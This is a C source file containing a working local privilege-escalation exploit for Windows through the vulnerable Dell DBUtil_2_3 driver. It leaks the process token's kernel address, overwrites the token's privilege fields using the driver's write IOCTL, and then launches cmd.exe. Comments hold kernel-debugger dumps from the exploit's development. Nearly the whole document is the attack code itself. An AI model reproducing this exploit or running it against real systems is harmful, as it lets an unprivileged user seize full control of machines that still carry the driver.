#include <stdio.h>
#include <windows.h>
#include "System_Handles.h"


#define IOCTL_CODE_WRITE 0x9B0C1EC8
#define IOCTL_CODE_READ 0x9B0C1EC4

#define SystemHandleInformation 0x10
#define SystemExtendedHandleInformation 0x40
#define SystemHandleInformationSize 1024 * 1024 * 2

typedef struct Payload { unsigned long long  blah1; void* blah2; unsigned long long blah3; unsigned long long blah4; }Payload
;

typedef struct outBuffer { unsigned long long  blah1; unsigned long long  blah2; unsigned long long  blah3; unsigned long long  blah4; }outBuffer
;

typedef  NTSTATUS(WINAPI* _NtQuerySystemInformation) (ULONG, PVOID, ULONG, PULONG)
;

unsigned long long LeakTokenAddressInKernel()
{
	DWORD returnLength = 0
		;
	HANDLE this_process_token = NULL
		;


	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &this_process_token))
	{
		printf("[-] Couldn't get a Handle to current process token . , error : 0x%d", GetLastError())
			;
		exit(1)
			;
	}

	_NtQuerySystemInformation NtQuerySystemInformation = GetProcAddress(LoadLibraryW(L"ntdll"), "NtQuerySystemInformation")
		;

	printf("[+] Address of NtQueryInformation is @:0x%llx\n", NtQuerySystemInformation)
		;

	/*leak kernel addresses of all the objects , allocate space for the heap to save them  */
	PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize)
		;
	NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, NULL);
	;

	printf("[+] Token for exploit process retrieved success : 0x%llx\n", this_process_token)
		;
	PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleinfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handles[0]
		;
	int counter = 0
		;
	HANDLE habalena = NULL
		;
	DWORD id = GetCurrentProcessId();

	while (handleinfo->UniqueProcessId != id || handleinfo->HandleValue != this_process_token)
	{
		handleinfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handles[++counter]
			;
	}

	return (unsigned long long)handleinfo->Object;
}

int main(int argc, char** argv)
{

	unsigned long long Exploit_token = LeakTokenAddressInKernel();
	;
	printf("[+] Address of Exploit token in kernelspace is @: 0x%llx\n", (unsigned long long*)Exploit_token)
		;


	/* Interacting */

	/*symlink \\.\\DBUtil_2_3 */
	HANDLE Device = CreateFileA("\\\\.\\DBUtil_2_3", FILE_ANY_ACCESS, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (Device == INVALID_HANDLE_VALUE) {
		puts("[-] Device doesn't exist , Make sure the driver is loaded !")
			;
		exit(1)
			;
	}
	puts("[+] Opened Handle to Device Success ")
		;

	/* Figuring out how the payload should be sent */


	/*sending the following :

	0x31 0x31 0x31 0x31 0x31 0x31 0x31 0x31
	0x32 0x32 0x32 0x32 0x32 0x32 0x32 0x32
	0x33 0x33 0x33 0x33 0x33 0x33 0x33 0x33
	0x34 0x34 0x34 0x34 0x34 0x34 0x34 0x34

	*/
	/* placing a breakpoint before the memmove shows :

	Breakpoint 0 hit
	db_util+0x5301:
			fffff800`19dd5301 e88ac4ffff      call    db_util+0x1790 (fffff800`19dd1790)
			0: kd> r
			rax=0000000000000008 rbx=ffff8408ca67fbd0 rcx=3232323265656565
			rdx=ffff8408ca7f75d8 rsi=0000000000000001 rdi=ffff8408ca67fbd0
			rip=fffff80019dd5301 rsp=fffff985b5b95710 rbp=ffff8408c96628c0
			 r8=0000000000000008  r9=ffff8408ca7f75c0 r10=fffff80019dd1170
			r11=0000000000000000 r12=0000000000000000 r13=0000000000000000
			r14=ffff8408ca764ce0 r15=ffff8408ca67fa80
			iopl=0         nv up ei pl zr na po nc
			cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
			db_util+0x5301:
			fffff800`19dd5301 e88ac4ffff      call    db_util+0x1790 (fffff800`19dd1790)
			0: kd> db 0xffff8408ca7f75d8
			ffff8408`ca7f75d8  34 34 34 34 34 34 34 34-00 00 00 00 00 00 00 00  44444444........
			ffff8408`ca7f75e8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
			ffff8408`ca7f75f8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
			ffff8408`ca7f7608  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
			ffff8408`ca7f7618  6c 6b 1d ee 00 00 00 00-00 00 07 02 49 6f 20 20  lk..........Io
			ffff8408`ca7f7628  b8 9f 81 5d 4d fa 68 d7-00 00 00 00 00 00 00 00  ...]M.h.........
			ffff8408`ca7f7638  00 00 00 00 00 00 00 00-00 05 0f ca 08 84 ff ff  ................
			ffff8408`ca7f7648  00 00 00 00 00 00 00 00-50 09 0f ca 08 84 ff ff  ........P.......

	Considering void * memmove( void * destination, const void * source, size_t size );
										RCX ,					RDX ,       R8
	we can see that the second line of our playlaod half of it is put on the higher bytes on rcx
	and the low part is added to the third (only the lower bytes) and put in rcx , now to control the rcx we'll make the third line 0 .

	okey we control the dest RCX , we control the src RDX , now lets overwrite that struct
	*/
	/*char* outbuffer[32] = {0}; */
	DWORD bytesRet = 0
		;
	/* offset _SEP_TOKEN_PRIVILEGES  "PRESENT" field in the current process token */
	;

	Payload payload = {
		0xDEADBEEFDEADBEEF,
		(void*)(Exploit_token + 0x40),
		0x0000000000000000,
		0xFFFFFFFFFFFFFFF0 }
	;
	outBuffer outbuffer = {
		0,
		0,
		0,
		0 }
	;

	/*BYTE payload[] = {
		0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, /*garbage
		Dest[0],Dest[1],Dest[2],Dest[3],Dest[4],Dest[5],Dest[6],Dest[7],
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 , /*addition
		0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF /* mask to enable all
	}; */
	if (!DeviceIoControl(Device, IOCTL_CODE_WRITE, &payload, sizeof(payload), &outbuffer, sizeof(outbuffer), &bytesRet, NULL))
	{
		printf("[-] error overwritting PRESENT FIELD , Error code = %d", GetLastError())
			;
		exit(1)
			;
	}
	puts("[+] Overwritting Present Field Success !")
		;
	/*windbg : Breakpoint 0 hit
		db_util+0x5301:
		fffff801`70905301 e88ac4ffff      call    db_util+0x1790 (fffff801`70901790)
		1: kd> r
		rax=0000000000000008 rbx=ffffe602e5175ed0 rcx=ffffd20afe0cc648
		rdx=ffffe602e39c2b18 rsi=0000000000000001 rdi=ffffe602e5175ed0
		rip=fffff80170905301 rsp=ffffcf863181b710 rbp=ffffe602e28e1220
		 r8=0000000000000008  r9=ffffe602e39c2b00 r10=fffff80170901170
		r11=0000000000000000 r12=0000000000000000 r13=0000000000000000
		r14=ffffe602e5796b50 r15=ffffe602e5175d80
		iopl=0         nv up ei pl zr na po nc
		cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
		db_util+0x5301:
		fffff801`70905301 e88ac4ffff      call    db_util+0x1790 (fffff801`70901790)
*/

/* offset _SEP_TOKEN_PRIVILEGES  "ENABLED" field in the current process token */
/*void* PRESENT = (void*)(Exploit_token + 0x40);*/



/*char* payload2[] = {
	0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, /*garbage
	Dest[0],Dest[1],Dest[2],Dest[3],Dest[4],Dest[5],Dest[6],Dest[7],
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 , /*addition
	0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF /* mask to enable all
};*/
	Payload payload_ = {
		0xDEADBEEFDEADBEEF,
		(void*)(Exploit_token + 0x48),
		0x0000000000000000,
		0xFFFFFFFFFFFFFFF0
	}
	;
	if (!DeviceIoControl(Device, IOCTL_CODE_WRITE, &payload_, sizeof(payload_), &outbuffer, sizeof(outbuffer), &bytesRet, NULL))
	{
		printf("[-] error overwritting ENABLED FIELD , Error code = %d", GetLastError())
			;
		exit(1)
			;
	}
	puts("[+] Overwritting ENABLED Field Success !")
		;
	/*Breakpoint 0 hit
		db_util+0x5301:
		fffff801`70905301 e88ac4ffff      call    db_util+0x1790 (fffff801`70901790)
		1: kd> r
		rax=0000000000000008 rbx=ffffe602e5175ed0 rcx=ffffd20afe0cc640
		rdx=ffffe602e39c2b18 rsi=0000000000000001 rdi=ffffe602e5175ed0
		rip=fffff80170905301 rsp=ffffcf863181b710 rbp=ffffe602e28e1220
		 r8=0000000000000008  r9=ffffe602e39c2b00 r10=fffff80170901170
		r11=0000000000000000 r12=0000000000000000 r13=0000000000000000
		r14=ffffe602e5796b50 r15=ffffe602e5175d80
		iopl=0         nv up ei pl zr na po nc
		cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
		db_util+0x5301:
		fffff801`70905301 e88ac4ffff      call    db_util+0x1790 (fffff801`70901790)*/




		/* offset _SEP_TOKEN_PRIVILEGES  "ENABLED_BY_DEFAULT" field in the current process token */
		/*void* ENABLED_BY_DEFAULT = (void*)(Exploit_token + 0x48);
		Dest = (char*)&ENABLED_BY_DEFAULT;
		BYTE payload3[] = {
			0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, /*garbage
			Dest[0],Dest[1],Dest[2],Dest[3],Dest[4],Dest[5],Dest[6],Dest[7],
			0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 , /*addition
			0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF /* mask to enable all
		};*/
	Payload payload__ = {
		0xDEADBEEFDEADBEEF,
		(void*)(Exploit_token + 0x50),
		0x0000000000000000,
		0xFFFFFFFFFFFFFFF0
	}
	;
	if (!DeviceIoControl(Device, IOCTL_CODE_WRITE, &payload__, sizeof(payload__), &outbuffer, sizeof(outbuffer), &bytesRet, NULL))
	{
		printf("[-] error overwritting ENABLED FIELD , Error code = %d", GetLastError())
			;
		exit(1)
			;
	}
	puts("[+] Overwritting Enabled_BY_DEFAULT Field Success !")
		;
	/*Breakpoint 0 hit
		db_util+0x5301:
		fffff801`70905301 e88ac4ffff      call    db_util+0x1790 (fffff801`70901790)*/

	system("cmd.exe");

}
